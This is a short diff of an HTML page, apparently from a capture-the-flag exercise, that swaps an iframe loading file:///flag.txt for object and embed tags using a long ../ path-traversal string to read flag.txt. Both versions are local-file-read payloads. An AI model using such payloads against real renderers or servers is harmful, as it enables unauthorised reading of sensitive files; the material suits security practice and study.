@@ -1,7 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Attempting Local File Read</h1>
-    <iframe src="file:///flag.txt" width="800px" height="500px"></iframe>
+    <h1>Retrieving Flag via Relative Path</h1>
+    <object data="../../../../../../../../../flag.txt" type="text/plain" width="500" height="200">
+        <embed src="../../../../../../../../../flag.txt">
+    </object>
 </body>
 </html>
